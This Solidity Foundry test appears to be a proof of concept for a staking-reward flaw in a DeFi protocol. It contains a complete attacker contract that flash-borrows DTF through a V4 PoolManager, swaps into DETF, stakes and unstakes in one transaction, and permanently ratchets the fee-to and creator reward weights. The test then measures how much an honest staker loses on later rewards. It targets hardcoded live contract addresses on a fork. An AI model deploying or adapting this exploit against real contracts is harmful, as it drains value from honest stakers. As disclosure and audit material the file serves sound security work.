// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

/// h3-cross-family-flash: V4 PoolManager flash (free DTF) -> weighted hook DTF->DETF -> sDETF stake/unstake
/// sink: StakedDETF._topUpWeights is top-up-only against the CURRENT totalGons, so a transient stake
/// permanently ratchets the fee-to / creator standing reward weights. Every later reward funding
/// (issuance seigniorage, natural expansion) is then split with the inflated weights; ordinary stakers lose.
/// Live fork of Robinhood 4663 (read-only, nothing broadcast).

interface IERC20L {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ISE {
    function exchangeIn(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut, address to, bool pre, uint256 dl)
        external returns (uint256 amountOut, uint256 amountRefunded);
    function previewExchangeIn(address tokenIn, uint256 amountIn, address tokenOut) external view returns (uint256 amountOut, uint256 amountRefunded);
}

interface IStaked {
    struct StakingState {
        uint256 totalGons;
        uint256 gonsPerUnit;
        uint256 accountedBacking;
        uint256 allocationDust;
        uint256 stakingDust;
        uint256 feeWeight;
        uint256 creatorWeight;
    }
    function stakingState() external view returns (StakingState memory);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IPM {
    function unlock(bytes calldata data) external returns (bytes memory);
    function take(address currency, address to, uint256 amount) external;
    function sync(address currency) external;
    function settle() external payable returns (uint256);
}

interface IDetfSync {
    function synchronizeRewards() external;
}

address constant PM = 0x8366a39CC670B4001A1121B8F6A443A643e40951;
address constant CUSTODY = 0x2E9C1F705aB967c5Af59249203d7495bDabb223b;
address constant HOOK = 0x46E068c2393e189Fbc86632f67210aF253a42Aa8;
address constant DETF = 0x4a5cFDC2b07016FCf917f4eD5A51C52111A0fcC7;
address constant SDETF = 0x4Fa4974a8a09660258B8edD430B51C1620eBFE5c;
address constant DTF = 0xeE5576Fa1Bcaa380e591D01245f406f3f384eb01;
address constant FEE_TO = 0x20af9A1e21a59a411cd3b0C40E70AF9084770b2E; // ownerOf(bond NFT #1)
address constant CREATOR = 0x72BeA6Fa3E68EF18c87D045Aac7C4Aa5249d933B; // ownerOf(bond NFT #2)

/// Unprivileged attacker contract.
contract Ratcheter {
    uint256 public detfPeak;

    function dl() internal view returns (uint256) { return block.timestamp + 1 hours; }

    function approveAll() external {
        IERC20L(DTF).approve(HOOK, type(uint256).max);
        IERC20L(DETF).approve(HOOK, type(uint256).max);
        IERC20L(DETF).approve(SDETF, type(uint256).max);
    }

    function attack(uint256 flashDtf) external {
        IPM(PM).unlock(abi.encode(flashDtf));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == PM, "pm only");
        uint256 flashDtf = abi.decode(data, (uint256));
        // 1. free intra-tx capital: borrow DTF from the PoolManager's flash accounting
        IPM(PM).take(DTF, address(this), flashDtf);
        // 2. buy DETF out of the weighted reserve hook in ratio-cap-safe chunks
        uint256 left = flashDtf;
        while (left > 0) {
            uint256 cap = IERC20L(DTF).balanceOf(CUSTODY) / 4;
            uint256 piece = left > cap ? cap : left;ISE(HOOK).exchangeIn(DTF, piece, DETF, 0, address(this), false, dl());
            left -= piece;
        }
        uint256 e = IERC20L(DETF).balanceOf(address(this));
        detfPeak = e;// 3. transient stake + immediate unstake (1:1, no lock)
        ISE(SDETF).exchangeIn(DETF, e, SDETF, 0, address(this), false, dl());
        uint256 s = IStaked(SDETF).balanceOf(address(this));ISE(SDETF).exchangeIn(SDETF, s, DETF, 0, address(this), false, dl());
        // 4. sell all DETF back to the hook
        uint256 bal = IERC20L(DETF).balanceOf(address(this));
        while (bal > 0) {
            uint256 hb = IERC20L(DETF).balanceOf(HOOK) / 5;
            uint256 piece = bal > hb ? hb : bal;ISE(HOOK).exchangeIn(DETF, piece, DTF, 0, address(this), false, dl());
            bal = IERC20L(DETF).balanceOf(address(this));
        }
        // 5. repay the flash principal (shortfall comes from the attacker's own DTF, counted as cost)
        IPM(PM).sync(DTF);
        require(IERC20L(DTF).transfer(PM, flashDtf), "repay");
        IPM(PM).settle();
        return "";
    }
}

contract StakingWeightRatchetTest is Test {
    Ratcheter attacker;
    address alice = makeAddr("aliceStaker");
    address bob = makeAddr("bobMinter");
    uint256 constant OWN_DTF = 20_000_000e18; // attacker's own DTF to cover round-trip swap costs (counted)

    function setUp() public {
        vm.createSelectFork(vm.envOr("LIVE_FORK_URL", string("https://rpc.mainnet.chain.robinhood.com")));
        console2.log("fork block", block.number);
        attacker = new Ratcheter();
        attacker.approveAll();
        deal(DTF, address(attacker), OWN_DTF);

        // Honest staker set up BEFORE the attack: mint DETF with 2M DTF and stake it.
        deal(DTF, alice, 2_000_000e18);
        vm.startPrank(alice);
        IERC20L(DTF).approve(DETF, type(uint256).max);(uint256 e,) = ISE(DETF).exchangeIn(DTF, 2_000_000e18, DETF, 0, alice, false, block.timestamp + 1);
        IERC20L(DETF).approve(SDETF, type(uint256).max);ISE(SDETF).exchangeIn(DETF, e, SDETF, 0, alice, false, block.timestamp + 1);
        vm.stopPrank();

        // Honest minter for the later reward event.
        deal(DTF, bob, 10_000_000e18);
        vm.prank(bob);
        IERC20L(DTF).approve(DETF, type(uint256).max);
    }

    function _logState(string memory tag) internal view returns (IStaked.StakingState memory st) {
        st = IStaked(SDETF).stakingState();
        console2.log(tag);
        console2.log("  totalGons    ", st.totalGons);
        console2.log("  feeWeight    ", st.feeWeight);
        console2.log("  creatorWeight", st.creatorWeight);
        console2.log("  fee/T  (bps) ", st.feeWeight * 10000 / st.totalGons);
        console2.log("  creator/T(bps)", st.creatorWeight * 10000 / st.totalGons);
        console2.log("  ordinary share of future rewards (bps)",
            st.totalGons * 10000 / (st.totalGons + st.feeWeight + st.creatorWeight));
    }

    /// Honest reward event: bob mints DETF with DTF (gate open on live) -> seigniorage pot -> fundRewards.
    function _honestRewardEvent() internal returns (uint256 aliceGain, uint256 feeGain, uint256 creatorGain) {
        uint256 a0 = IStaked(SDETF).balanceOf(alice);
        uint256 f0 = IStaked(SDETF).balanceOf(FEE_TO);
        uint256 c0 = IStaked(SDETF).balanceOf(CREATOR);
        vm.prank(bob);ISE(DETF).exchangeIn(DTF, 2_000_000e18, DETF, 0, bob, false, block.timestamp + 1);
        aliceGain = IStaked(SDETF).balanceOf(alice) - a0;
        feeGain = IStaked(SDETF).balanceOf(FEE_TO) - f0;
        creatorGain = IStaked(SDETF).balanceOf(CREATOR) - c0;
    }

    function test_ratchet_flashStake_permanentlyDilutesStakers() public {
        IStaked.StakingState memory s0 = _logState("BEFORE");
        uint256 snap = vm.snapshotState();

        // ---- CONTROL: same honest reward event, no attack ----
        (uint256 aCtl, uint256 fCtl, uint256 cCtl) = _honestRewardEvent();
        console2.log("CONTROL alice gain   ", aCtl);
        console2.log("CONTROL feeTo gain   ", fCtl);
        console2.log("CONTROL creator gain ", cCtl);
        vm.revertToState(snap);

        // ---- ATTACK (unprivileged contract, one tx, PM flash repaid in-tx) ----
        uint256 d0 = IERC20L(DTF).balanceOf(address(attacker));
        attacker.attack(100_000_000e18);
        uint256 d1 = IERC20L(DTF).balanceOf(address(attacker));
        console2.log("attacker peak DETF staked (transient)", attacker.detfPeak());
        console2.log("attacker DTF cost (own capital spent)", d0 - d1);
        assertEq(IStaked(SDETF).balanceOf(address(attacker)), 0, "attacker holds no stake");
        assertEq(IERC20L(DETF).balanceOf(address(attacker)), 0, "attacker holds no DETF");
        IStaked.StakingState memory s1 = _logState("AFTER ATTACK");
        assertEq(s1.totalGons, s0.totalGons, "ordinary gons back to start (dust aside)");
        assertGt(s1.feeWeight, s0.feeWeight, "fee weight ratcheted");
        assertGt(s1.creatorWeight, s0.creatorWeight, "creator weight ratcheted");

        // ---- weights persist: later honest reward event split with inflated weights ----
        (uint256 aAtk, uint256 fAtk, uint256 cAtk) = _honestRewardEvent();
        console2.log("ATTACKED alice gain  ", aAtk);
        console2.log("ATTACKED feeTo gain  ", fAtk);
        console2.log("ATTACKED creator gain", cAtk);
        console2.log("alice loss per reward event (DETF raw)", aCtl - aAtk);
        console2.log("alice loss (bps of control reward)", (aCtl - aAtk) * 10000 / aCtl);
        assertLt(aAtk, aCtl, "honest staker receives less of every future reward");
        assertGt(fAtk + cAtk, fCtl + cCtl, "fee/creator take more");
        _logState("AFTER REWARD EVENT");
    }
}
